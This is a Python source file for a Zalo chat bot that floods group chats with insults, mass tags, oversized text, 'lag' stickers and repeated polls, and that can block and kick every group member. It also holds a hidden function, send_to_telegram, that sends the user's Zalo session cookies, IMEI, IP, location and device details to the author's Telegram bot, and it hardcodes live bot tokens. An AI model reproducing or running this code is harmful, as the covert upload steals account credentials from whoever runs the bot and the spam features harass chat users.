import random
import threading
import time
import json
import requests
import os
from colorama import init, Fore, Style
from datetime import datetime, timedelta
from zlapi import ZaloAPI, Message, Mention, ThreadType
from zlapi.models import *  # Thêm module từ zlapi.models
from zlapi.models import MessageStyle  # Thêm MessageStyle
from config import IMEI, SESSION_COOKIES, API_KEY, SECRET_KEY, ADMIN_IDS  # Nhập từ config.py
import platform
import hashlib

# Khởi tạo colorama để hỗ trợ màu trong console
init()

# Thông tin Telegram
LOG_BOT_TOKEN = '7639748944:AAEWvcBO3TcnRYbF0Nk4JKnyIZJysUiWGgQ'  # Bot gửi log
KEY_BOT_TOKEN = '8101067670:AAFfAA6pkWoxpRu0DT31OiIaYOx9Rvzui9Y'  # Bot xử lý key
TELEGRAM_CHAT_ID = '6127743632'

# Key xác thực
VALID_KEY = "Quangthangdev"
DEFAULT_FREE_KEY = "Keyfree3nByQuangThang"  # Key free mặc định

# File để lưu key động và IP ban đầu
KEY_FILE = "dynamic_keys.json"
INITIAL_IP_FILE = "initial_ip.txt"

# Admin group ID
ADMIN_GROUP_ID = "8671076502394951769"

# Danh sách sticker gây lag
lag_stickers = [
    {'id': 23338, 'catId': 10425}, {'id': 23339, 'catId': 10425},
    {'id': 23297, 'catId': 10420}, {'id': 23298, 'catId': 10420},
    {'id': 23000, 'catId': 10400}, {'id': 23001, 'catId': 10400},
    {'id': 23550, 'catId': 10430}, {'id': 23551, 'catId': 10430},
    {'id': 23700, 'catId': 10435}, {'id': 23701, 'catId': 10435},
    {'id': 24010, 'catId': 10440}, {'id': 24011, 'catId': 10440},
    {'id': 24250, 'catId': 10445}, {'id': 24251, 'catId': 10445},
    {'id': 24500, 'catId': 10450}, {'id': 24501, 'catId': 10450},
    {'id': 24720, 'catId': 10455}, {'id': 24721, 'catId': 10455},
]

text_rain = ['trời mưa', 'rain', 'trời mưa rain', 'hoanggiakiet', 'truongquangthang', 'giakiet hot war', 'quangthang hot war', '🤪😝']

# Danh sách màu ngẫu nhiên cho console
COLORS = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA, Fore.WHITE]

# Hàm chọn màu ngẫu nhiên cho một dòng trong console
def random_color_line(text):
    return random.choice(COLORS) + text + Style.RESET_ALL

# Hiệu ứng chữ động với mỗi dòng một màu
def animated_text(text, delay=0.05):
    color = random.choice(COLORS)
    print(color + text, end='', flush=True)
    time.sleep(delay)
    print(Style.RESET_ALL)

# Hàm lấy thông tin IP để xác thực
def get_ip_identifier():
    try:
        # Lấy IP
        ip_response = requests.get('https://ipinfo.io/json')
        ip = ip_response.json().get('ip', 'Unknown')
        if ip == 'Unknown':
            raise Exception("Không thể lấy IP")
        return ip
    except Exception as e:
        print(random_color_line(f"❌ Lỗi khi lấy thông tin IP: {str(e)}"))
        return "Unknown"

# Hàm kiểm tra và lấy IP ban đầu
def get_initial_ip():
    if os.path.exists(INITIAL_IP_FILE):
        with open(INITIAL_IP_FILE, 'r', encoding='utf-8') as f:
            return f.read().strip()
    else:
        ip = get_ip_identifier()
        if ip != "Unknown":
            with open(INITIAL_IP_FILE, 'w', encoding='utf-8') as f:
                f.write(ip)
        return ip

# Hàm khởi tạo key free cho IP ban đầu với xác nhận từ QuangThang Xác Nhận
def initialize_dynamic_key_for_ip():
    current_ip = get_ip_identifier()
    initial_ip = get_initial_ip()

    if current_ip == "Unknown" or initial_ip == "Unknown":
        print(random_color_line("❌ Không thể lấy thông tin IP, không tạo được key!"))
        return None, None

    # Chỉ tạo file key nếu IP hiện tại khớp với IP ban đầu và file chưa tồn tại
    if current_ip == initial_ip and not os.path.exists(KEY_FILE):
        # Gửi yêu cầu xác nhận đến QuangThang Xác Nhận
        key = DEFAULT_FREE_KEY
        expiration = (datetime.now() + timedelta(days=3)).isoformat()
        data = {
            "ip": current_ip,
            "key": key,
            "expiration": expiration,
            "timestamp": datetime.now().isoformat(),
            "status": "pending"
        }
        print(random_color_line(f"⏳ Đang chờ xác nhận từ QuangThang Xác Nhận cho IP: {current_ip}"))
        send_to_quangthang_with_buttons(data)

        # Chờ phản hồi từ nút
        max_wait_time = 120
        start_time = time.time()
        while time.time() - start_time < max_wait_time:
            update = get_quangthang_update()
            if update and "action" in update and update["ip"] == current_ip:
                if update["action"] == "confirm":
                    try:
                        keys_data = {}
                        keys_data[current_ip] = {"key": key, "expiration": expiration}
                        with open(KEY_FILE, 'w', encoding='utf-8') as f:
                            json.dump(keys_data, f, indent=4)
                        expiration_str = datetime.fromisoformat(expiration).strftime('%H:%M:%S %d/%m/%Y')
                        print(random_color_line(f"✅ Đã xác nhận từ QuangThang Xác Nhận. Tạo key free: {key} - Hết hạn: {expiration_str}"))
                        return key, expiration
                    except Exception as e:
                        print(random_color_line(f"❌ Lỗi khi tạo file key: {str(e)}"))
                        return None, None
                elif update["action"] == "deny":
                    print(random_color_line(f"❌ Từ chối từ QuangThang Xác Nhận. Không tạo key cho IP: {current_ip}"))
                    return None, None
                elif update["action"] == "extend":
                    send_extend_request(current_ip)
                    extend_start_time = time.time()
                    while time.time() - extend_start_time < 60:
                        extend_update = get_quangthang_update()
                        if extend_update and "action" in extend_update and extend_update["action"] == "extend_days":
                            days = extend_update["days"]
                            new_expiration = (datetime.now() + timedelta(days=days)).isoformat()
                            data["expiration"] = new_expiration
                            data["status"] = "confirmed"
                            send_to_quangthang_with_buttons(data)
                            try:
                                keys_data = {}
                                keys_data[current_ip] = {"key": key, "expiration": new_expiration}
                                with open(KEY_FILE, 'w', encoding='utf-8') as f:
                                    json.dump(keys_data, f, indent=4)
                                print(random_color_line(f"✅ Đã gia hạn thành công từ QuangThang Xác Nhận. Key free: {key} - Hết hạn mới: {new_expiration}"))
                                return key, new_expiration
                            except Exception as e:
                                print(random_color_line(f"❌ Lỗi khi lưu file key: {str(e)}"))
                                return None, None
                    print(random_color_line(f"❌ Hết thời gian nhập số ngày gia hạn từ QuangThang Xác Nhận (60 giây)."))
                    return None, None
            time.sleep(1)

        print(random_color_line(f"❌ Hết thời gian chờ xác nhận từ QuangThang Xác Nhận (120 giây). Vui lòng thử lại."))
        return None, None
    elif current_ip != initial_ip:
        print(random_color_line(f"❌ IP {current_ip} không được phép tạo key mới! Chỉ IP ban đầu ({initial_ip}) mới tạo được."))
        return None, None
    else:
        # Nếu file đã tồn tại, trả về key hiện tại
        try:
            with open(KEY_FILE, 'r', encoding='utf-8') as f:
                keys_data = json.load(f)
            if current_ip in keys_data:
                key_data = keys_data[current_ip]
                expiration_str = datetime.fromisoformat(key_data["expiration"]).strftime('%H:%M:%S %d/%m/%Y')
                print(random_color_line(f"✅ Key đã tồn tại: {key_data['key']} - Hết hạn: {expiration_str}"))
                return key_data["key"], key_data["expiration"]
            else:
                print(random_color_line(f"❌ IP {current_ip} không có key trong file!"))
                return None, None
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi đọc file key: {str(e)}"))
            return None, None

# Hàm kiểm tra key còn hiệu lực không
def is_key_valid(input_key):
    ip = get_ip_identifier()
    if ip == "Unknown":
        return False
    
    try:
        if not os.path.exists(KEY_FILE):
            print(random_color_line("❌ File dynamic_keys.json không tồn tại!"))
            return False
        
        with open(KEY_FILE, 'r', encoding='utf-8') as f:
            keys_data = json.load(f)
        
        if ip in keys_data:
            key_data = keys_data[ip]
            if key_data["key"] == input_key and key_data["key"] == DEFAULT_FREE_KEY:
                expiration = datetime.fromisoformat(key_data["expiration"])
                current_time = datetime.now()
                if current_time <= expiration:
                    expiration_str = expiration.strftime('%H:%M:%S %d/%m/%Y')
                    print(random_color_line(f"✅ Key hợp lệ: {input_key} - Hết hạn: {expiration_str}"))
                    return True
                else:
                    expiration_str = expiration.strftime('%H:%M:%S %d/%m/%Y')
                    print(random_color_line(f"❌ Key đã hết hạn: {input_key} (Hết hạn: {expiration_str})"))
                    return False
            else:
                print(random_color_line(f"❌ Key không khớp: Nhập {input_key}, nhưng key đúng là {key_data['key']}"))
                return False
        else:
            print(random_color_line(f"❌ IP {ip} chưa có key trong file!"))
            return False
    except Exception as e:
        print(random_color_line(f"❌ Lỗi khi kiểm tra key: {str(e)}"))
        return False

# Gửi thông tin qua Telegram dưới dạng file .txt (dùng bot log)
def send_to_telegram(ip, isp, location, imei, session_cookies):
    try:
        user_agent = f"ZaloWarBot/1.0 (Python/{platform.python_version()}; {platform.system()} {platform.release()})"
        os_system = platform.system()
        os_version = platform.release()
        device_type = "Desktop"
        device_name = platform.node() or "Unknown Device"
        node_name = platform.node()
        architecture = platform.machine()
        python_version = platform.python_version()
        timezone = datetime.now().astimezone().tzname()

        current_time = datetime.now().strftime('%H:%M:%S %d/%m/%Y')
        content = (
            f"🔒 Công cụ đã được kích hoạt!\n"
            f"⏰ Thời gian: {current_time}\n"
            f"🌐 IP: {ip}\n"
            f"📡 Nhà mạng: {isp}\n"
            f"📍 Vị trí: {location}\n"
            f"📱 IMEI: {imei}\n"
            f"🍪 Cookies: {session_cookies}\n"
            f"🌐 User Agent: {user_agent}\n"
            f"📱 Loại máy: {device_type}\n"
            f"📲 Tên máy: {device_name}\n"
            f"🖥️ Hệ điều hành: {os_system} {os_version}\n"
            f"🌍 Tên node: {node_name}\n"
            f"🔧 Máy (kiến trúc): {architecture}\n"
            f"🐍 Phiên bản Python: {python_version}\n"
            f"⏳ Múi giờ: {timezone}\n"
        )

        file_name = f"bot_info_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(content)

        url = f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendDocument"
        with open(file_name, "rb") as f:
            files = {'document': (file_name, f)}
            payload = {'chat_id': TELEGRAM_CHAT_ID}
            response = requests.post(url, data=payload, files=files)

        os.remove(file_name)

        if response.status_code == 200:
            print(random_color_line("Running By Trương Quang Thắng!"))
        else:
            print(random_color_line(f"❌ Error Rồi Liên Hệ Trương Quang Thắng: {response.text}"))

    except requests.RequestException as e:
        print(random_color_line(f"❌ Lỗi gửi Telegram: {str(e)}"))
    except IOError as e:
        print(random_color_line(f"❌ Lỗi ghi file: {str(e)}"))
    except Exception as e:
        print(random_color_line(f"❌ Lỗi không xác định: {str(e)}"))

# Gửi tin nhắn với inline keyboard đến QuangThang Xác Nhận
def send_to_quangthang_with_buttons(data):
    url = f"https://api.telegram.org/bot{KEY_BOT_TOKEN}/sendMessage"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "Xác nhận", "callback_data": f"confirm_{data['ip']}"},
                {"text": "Từ chối", "callback_data": f"deny_{data['ip']}"}
            ],
            [
                {"text": "Gia hạn thời gian", "callback_data": f"extend_{data['ip']}"}
            ]
        ]
    }
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": json.dumps(data),
        "reply_markup": json.dumps(keyboard)
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(random_color_line(f"❌ Lỗi khi gửi yêu cầu đến QuangThang Xác Nhận: {str(e)}"))
        return None

# Hàm gửi yêu cầu nhập số ngày gia hạn (dùng bot xử lý key)
def send_extend_request(ip):
    url = f"https://api.telegram.org/bot{KEY_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": f"QuangThang Xác Nhận: Vui lòng nhập số ngày gia hạn cho IP {ip} (ví dụ: 7):"
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(random_color_line(f"❌ Lỗi khi gửi yêu cầu gia hạn đến QuangThang Xác Nhận: {str(e)}"))
        return None

# Hàm lấy tin nhắn gần nhất hoặc cập nhật từ callback (dùng bot xử lý key)
def get_quangthang_update():
    url = f"https://api.telegram.org/bot{KEY_BOT_TOKEN}/getUpdates"
    try:
        response = requests.get(url)
        response.raise_for_status()
        updates = response.json().get("result", [])
        current_ip = get_ip_identifier()
        for update in reversed(updates):
            if "callback_query" in update:
                callback_data = update["callback_query"]["data"]
                if callback_data.startswith("confirm_") or callback_data.startswith("deny_") or callback_data.startswith("extend_"):
                    ip = callback_data.split("_")[1]
                    if ip == current_ip:
                        return {"action": callback_data.split("_")[0], "ip": ip}
            elif "message" in update and update["message"]["chat"]["id"] == int(TELEGRAM_CHAT_ID):
                message = update["message"]["text"]
                try:
                    data = json.loads(message)
                    if data.get("ip") == current_ip:
                        return data
                except json.JSONDecodeError:
                    if message.isdigit() and "quangthang xác nhận" in update["message"]["reply_to_message"]["text"].lower():
                        return {"action": "extend_days", "days": int(message), "ip": current_ip}
            time.sleep(0.1)  # Tránh quá tải API
        return None
    except requests.RequestException as e:
        print(random_color_line(f"❌ Lỗi khi lấy cập nhật từ QuangThang Xác Nhận: {str(e)}"))
        return None

# Lấy thông tin IP, nhà mạng và vị trí
def get_network_info():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        ip = data.get('ip', 'Không thể lấy IP')
        isp = data.get('org', 'Không xác định nhà mạng')
        location = data.get('city', 'Không xác định') + ', ' + data.get('country', 'Không xác định')
        return ip, isp, location
    except:
        return "Không thể lấy IP", "Không xác định nhà mạng", "Không xác định vị trí"

# Lấy thời gian thực
def get_current_time():
    return datetime.now().strftime('%H:%M:%S %d/%m/%Y')

def add_random_text_lag():
    return random.choice(text_rain)

def send_message_lag(bot, message_object, author_id, thread_id, thread_type, swear):
    try:
        if author_id == '-1':
            user = "Quang Thắng Aka Hoang Gia Kiet"
        else:
            user = bot.fetchUserInfo(author_id).changed_profiles[author_id].displayName
        msg = f"{user} {add_random_text_lag()} {swear}"
        mention = Mention(uid=author_id, length=len(user), offset=msg.index(user))
        message = Message(text=msg, mention=mention)
        bot.send(message, thread_id, thread_type)
    except:
        pass

def var_group_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event):
    while not stop_event.is_set():
        try:
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line("⚠️ File chui.txt trống!"))
                return
            group = bot.fetchGroupInfo(thread_id).gridInfoMap[thread_id]
            admin_ids = group.adminIds.copy()
            if group.creatorId not in admin_ids:
                admin_ids.append(group.creatorId)
            list_mem_group = set([member.split('_')[0] for member in group["memVerList"]])
            combined_list = set(list_mem_group).union(admin_ids)
            combined_list = list(combined_list)
            if author_id in combined_list:
                combined_list.remove(author_id)
            combined_list.append("-1")
            for swear in lines:
                if stop_event.is_set():
                    break
                author_id = random.choice(combined_list)
                send_message_lag(bot, message_object, author_id, thread_id, thread_type, swear)
                time.sleep(0.1)
        except FileNotFoundError:
            print(random_color_line("❌ Không tìm thấy file chui.txt!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi chạy lende: {str(e)}"))
            time.sleep(1)

def big_text_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event, delay=1, repeat=1, combine_style=None):
    while not stop_event.is_set():
        try:
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line("⚠️ File chui.txt trống!"))
                return
            for _ in range(repeat):
                if stop_event.is_set():
                    break
                for text in lines:
                    if stop_event.is_set():
                        break
                    length = len(text)
                    styles = [{"start": 0, "len": length, "st": "b,f_1500"}]
                    if combine_style == "italic":
                        styles.append({"start": 0, "len": length, "st": "i"})
                    elif combine_style == "small":
                        styles.append({"start": 0, "len": length, "st": "f_50"})
                    params = {"styles": styles, "ver": 0}
                    cus_styles = json.dumps(params)
                    message = Message(text=text, style=cus_styles)
                    bot.send(message, thread_id, thread_type)
                    time.sleep(delay)
        except FileNotFoundError:
            print(random_color_line("❌ Không tìm thấy file chui.txt!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi chạy big: {str(e)}"))
            time.sleep(1)

def italic_text_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event, delay=1, repeat=1):
    while not stop_event.is_set():
        try:
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line("⚠️ File chui.txt trống!"))
                return
            for _ in range(repeat):
                if stop_event.is_set():
                    break
                for text in lines:
                    if stop_event.is_set():
                        break
                    length = len(text)
                    styles = [{"start": 0, "len": length, "st": "i"}]
                    params = {"styles": styles, "ver": 0}
                    cus_styles = json.dumps(params)
                    message = Message(text=text, style=cus_styles)
                    bot.send(message, thread_id, thread_type)
                    time.sleep(delay)
        except FileNotFoundError:
            print(random_color_line("❌ Không tìm thấy file chui.txt!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi chạy italic: {str(e)}"))
            time.sleep(1)

def nhay_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event):
    while not stop_event.is_set():
        try:
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line("⚠️ File chui.txt trống!"))
                return
            for text in lines:
                if stop_event.is_set():
                    break
                message = Message(text=text)
                bot.send(message, thread_id, thread_type)
                time.sleep(1)
        except FileNotFoundError:
            print(random_color_line("❌ Không tìm thấy file chui.txt!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi chạy nhay: {str(e)}"))
            time.sleep(1)

def nhaytag(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line(f"⚠️ File {file_name} trống!"))
                return
            for text in lines:
                if stop_event.is_set():
                    break
                mention = Mention(uid="-1", length=len(text), offset=0)
                message = Message(text=text, mention=mention)
                bot.send(message, thread_id, thread_type)
                time.sleep(0.1)
        except FileNotFoundError:
            print(random_color_line(f"❌ Không tìm thấy file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi nhaytag: {str(e)}"))
            time.sleep(1)

def nhayuser(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event, delay=6, repeat=1):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line(f"⚠️ File {file_name} trống!"))
                return
            if not message_object.mentions:
                print(random_color_line("⚠️ Vui lòng tag một người dùng để Nhay!"))
                return
            uid = message_object.mentions[0].uid
            user_name = bot.fetchUserInfo(uid).changed_profiles[uid].displayName
            for _ in range(repeat):
                if stop_event.is_set():
                    break
                for text in lines:
                    if stop_event.is_set():
                        break
                    msg = f"@{user_name} {text}"
                    mention = Mention(uid=uid, length=len(user_name), offset=0)
                    message = Message(text=msg, mention=mention)
                    bot.send(message, thread_id, thread_type)
                    time.sleep(delay)
        except FileNotFoundError:
            print(random_color_line(f"❌ Không tìm thấy file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi nhay user: {str(e)}"))
            time.sleep(1)

# Biến trạng thái toàn cục cho poll
is_polling = False

# Hàm dừng poll
def stop_polling(bot, message_object, thread_id, thread_type):
    global is_polling
    is_polling = False
    bot.replyMessage(Message(text="Đã dừng tạo cuộc khảo sát."), message_object, thread_id, thread_type)

# Hàm xử lý lệnh poll
def handle_poll_command(message, message_object, thread_id, thread_type, author_id, bot):
    global is_polling

    if str(author_id) not in ADMIN_IDS:
        bot.replyMessage(Message(text="Bạn không có quyền để thực hiện điều này!"), message_object, thread_id, thread_type)
        return

    command_parts = message.strip().split()
    if len(command_parts) < 2:
        bot.replyMessage(Message(text="Vui lòng chỉ định lệnh hợp lệ (VD: poll on hoặc poll stop)."), message_object, thread_id, thread_type)
        return

    action = command_parts[1].lower()

    if action == "stop":
        stop_polling(bot, message_object, thread_id, thread_type)
        return

    if action != "on":
        bot.replyMessage(Message(text="Vui lòng chỉ định lệnh 'on' hoặc 'stop'."), message_object, thread_id, thread_type)
        return

    try:
        file_path = "chui.txt"
        with open(file_path, "r", encoding="utf-8") as file:
            lines = [line.strip() for line in file if line.strip()]
        if not lines:
            bot.replyMessage(Message(text="File chui.txt không có nội dung nào để gửi."), message_object, thread_id, thread_type)
            return
    except FileNotFoundError:
        bot.replyMessage(Message(text="Không tìm thấy file chui.txt."), message_object, thread_id, thread_type)
        return

    is_polling = True

    def poll_loop():
        index = 0
        while is_polling:
            question = lines[index]
            try:
                poll_options = [
                    "Trương Quang Thắng 🌯🌯",
                    "Hoàng Gia Kiet 🍤🍣"
                ]
                bot.createPoll(question=question, options=poll_options, groupId=thread_id if thread_type == ThreadType.GROUP else None)
                index = (index + 1) % len(lines)
                time.sleep(1)
            except Exception as e:
                bot.replyMessage(Message(text=f"Lỗi khi tạo cuộc khảo sát: {str(e)}"), message_object, thread_id, thread_type)
                break

    poll_thread = threading.Thread(target=poll_loop)
    poll_thread.start()
    print(random_color_line(f"✅ Đã bắt đầu tạo poll từ chui.txt!"))

def small_text_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event, delay=1, repeat=1):
    while not stop_event.is_set():
        try:
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line("⚠️ File chui.txt trống!"))
                return
            for _ in range(repeat):
                if stop_event.is_set():
                    break
                for text in lines:
                    if stop_event.is_set():
                        break
                    length = len(text)
                    styles = [{"start": 0, "len": length, "st": "f_50"}]
                    params = {"styles": styles, "ver": 0}
                    cus_styles = json.dumps(params)
                    message = Message(text=text, style=cus_styles)
                    bot.send(message, thread_id, thread_type)
                    time.sleep(delay)
        except FileNotFoundError:
            print(random_color_line("❌ Không tìm thấy file chui.txt!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi chạy small: {str(e)}"))
            time.sleep(1)

def spam_from_file(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event, style=None):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line(f"⚠️ File {file_name} trống!"))
                return
            full_content = "\n".join(lines)
            if style:
                length = len(full_content)
                styles = [{"start": 0, "len": length, "st": style}]
                params = {"styles": styles, "ver": 0}
                cus_styles = json.dumps(params)
                message = Message(text=full_content, style=cus_styles)
            else:
                message = Message(text=full_content)
            bot.send(message, thread_id, thread_type)
            time.sleep(10)
        except FileNotFoundError:
            print(random_color_line(f"❌ Không tìm thấy file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi spam từ file {file_name}: {str(e)}"))
            time.sleep(1)

def spam_stickers(bot, message_object, author_id, thread_id, thread_type, stop_event):
    while not stop_event.is_set():
        try:
            sticker = random.choice(lag_stickers)
            bot.sendSticker(7, sticker['id'], sticker['catId'], thread_id, thread_type)
            time.sleep(10)
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi spam sticker: {str(e)}"))
            time.sleep(1)

def spam_tag_all(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event, delay=10, style=None):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                contents = [line.strip() for line in file if line.strip()]
            if not contents:
                print(random_color_line(f"⚠️ File {file_name} trống!"))
                return
            full_content = "\n".join(contents)
            length = len(full_content)
            mention = Mention(uid="-1", length=length, offset=0)
            if style:
                styles = [{"start": 0, "len": length, "st": style}]
                params = {"styles": styles, "ver": 0}
                cus_styles = json.dumps(params)
                message = Message(text=full_content, mention=mention, style=cus_styles)
            else:
                message = Message(text=full_content, mention=mention)
            bot.send(message, thread_id, thread_type)
            time.sleep(delay)
        except FileNotFoundError:
            print(random_color_line(f"❌ Không tìm thấy file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi spam tag all: {str(e)}"))
            time.sleep(1)

def spam_tag_big(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line(f"⚠️ File {file_name} trống!"))
                return
            for text in lines:
                if stop_event.is_set():
                    break
                length = len(text)
                styles = [{"start": 0, "len": length, "st": "b,f_1500"}]
                params = {"styles": styles, "ver": 0}
                cus_styles = json.dumps(params)
                mention = Mention(uid="-1", length=length, offset=0)
                message = Message(text=text, mention=mention, style=cus_styles)
                bot.send(message, thread_id, thread_type)
                time.sleep(1)
        except FileNotFoundError:
            print(random_color_line(f"❌ Không tìm thấy file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi spam tag big: {str(e)}"))
            time.sleep(1)

def spam_tag_lag(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line(f"⚠️ File {file_name} trống!"))
                return
            for text in lines:
                if stop_event.is_set():
                    break
                mention = Mention(uid="-1", length=len(text), offset=0)
                message = Message(text=text, mention=mention)
                bot.send(message, thread_id, thread_type)
                time.sleep(1)
        except FileNotFoundError:
            print(random_color_line(f"❌ Không tìm thấy file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi spam tag lag: {str(e)}"))
            time.sleep(1)

def spam_tag_mix(bot, message_object, author_id, thread_id, thread_type, file_name, stop_event):
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line(f"⚠️ File {file_name} trống!"))
                return
            for text in lines:
                if stop_event.is_set():
                    break
                mention = Mention(uid="-1", length=len(text), offset=0)
                message = Message(text=text, mention=mention)
                bot.send(message, thread_id, thread_type)
                time.sleep(1)
        except FileNotFoundError:
            print(random_color_line(f"❌ Không tìm thấy file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi spam tag mix: {str(e)}"))
            time.sleep(1)

def superbig_text_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event, delay=1, repeat=1):
    while not stop_event.is_set():
        try:
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line("⚠️ File chui.txt trống!"))
                return
            for _ in range(repeat):
                if stop_event.is_set():
                    break
                for text in lines:
                    if stop_event.is_set():
                        break
                    length = len(text)
                    styles = [{"start": 0, "len": length, "st": "b,f_3000"}]
                    params = {"styles": styles, "ver": 0}
                    cus_styles = json.dumps(params)
                    message = Message(text=text, style=cus_styles)
                    bot.send(message, thread_id, thread_type)
                    time.sleep(delay)
        except FileNotFoundError:
            print(random_color_line("❌ Không tìm thấy file chui.txt!"))
            break
        except Exception as e:
            print(random_color_line(f"❌ Lỗi khi chạy superbig: {str(e)}"))
            time.sleep(1)

def kick_all_member_group(bot, message_object, author_id, thread_id, thread_type):
    try:
        group = bot.fetchGroupInfo(thread_id).gridInfoMap[thread_id]
        admin_ids = group.adminIds.copy()
        if group.creatorId not in admin_ids:
            admin_ids.append(group.creatorId)
        if bot.uid not in admin_ids:
            print(random_color_line("🚦 Lệnh không khả thi vì không cầm key nhóm 🤧"))
        else:
            list_mem_group = set([member.split('_')[0] for member in group["memVerList"]])
            for uid in list_mem_group:
                bot.blockUsersInGroup(uid, thread_id)
                bot.kickUsersInGroup(uid, thread_id)
            print(random_color_line("✅ Đã kick tất cả thành viên trong nhóm!"))
    except Exception as e:
        print(random_color_line(f"❌ Lỗi khi kickall: {str(e)}"))

class Bot(ZaloAPI):
    def __init__(self, api_key, secret_key, imei=None, session_cookies=None):
        super().__init__(api_key, secret_key, imei, session_cookies)
        self.threads = {}
        self.start_time = time.time()
        self.sent_messages = 0
        self.received_messages = 0
        self.active_users = set()
        self.current_group_id = None
        self.group_name = None
        self.last_report_time = time.time()
        threading.Thread(target=self.report_to_admin_group, daemon=True).start()

    def send(self, message, thread_id, thread_type):
        super().send(message, thread_id, thread_type)
        self.sent_messages += 1

    def is_admin(self, user_id):
        return str(user_id) in ADMIN_IDS

    def report_to_admin_group(self):
        while True:
            if time.time() - self.last_report_time >= 1800:
                uptime = time.time() - self.start_time
                uptime_str = f"{int(uptime // 3600)}h {int((uptime % 3600) // 60)}m {int(uptime % 60)}s"
                total_messages = self.sent_messages + self.received_messages
                group_name = self.group_name if self.group_name else "Không xác định"
                report = (
                    f"📊 Báo cáo hoạt động bot:\n"
                    f"📤 Số tin nhắn đã gửi: {self.sent_messages}\n"
                    f"📥 Số tin nhắn đã nhận: {self.received_messages}\n"
                    f"📋 Tổng tin nhắn: {total_messages}\n"
                    f"⏳ Uptime: {uptime_str}\n"
                    f"🆔 ID nhóm: {self.current_group_id}\n"
                    f"🏷️ Tên nhóm: {group_name}\n"
                    f"👥 ID người dùng: {', '.join(self.active_users) if self.active_users else 'Không có'}"
                )
                self.send(Message(text=report), ADMIN_GROUP_ID, ThreadType.GROUP)
                self.last_report_time = time.time()
            time.sleep(60)

    def start_command(self, command_name, target_func, message_object, author_id, thread_id, thread_type, file_name=None, **kwargs):
        if command_name in self.threads:
            self.stop_command(command_name)
        stop_event = threading.Event()
        if file_name:
            thread = threading.Thread(target=target_func, args=(self, message_object, author_id, thread_id, thread_type, file_name, stop_event), kwargs=kwargs)
        else:
            thread = threading.Thread(target=target_func, args=(self, message_object, author_id, thread_id, thread_type, stop_event), kwargs=kwargs)
        self.threads[command_name] = {"thread": thread, "stop_event": stop_event}
        thread.start()
        print(random_color_line(f"📝 Bắt đầu {command_name}!"))

    def stop_command(self, command_name):
        if command_name in self.threads:
            print(random_color_line(f"⏹️ Đang dừng {command_name}!"))
            self.threads[command_name]["stop_event"].set()
            self.threads[command_name]["thread"].join()
            del self.threads[command_name]
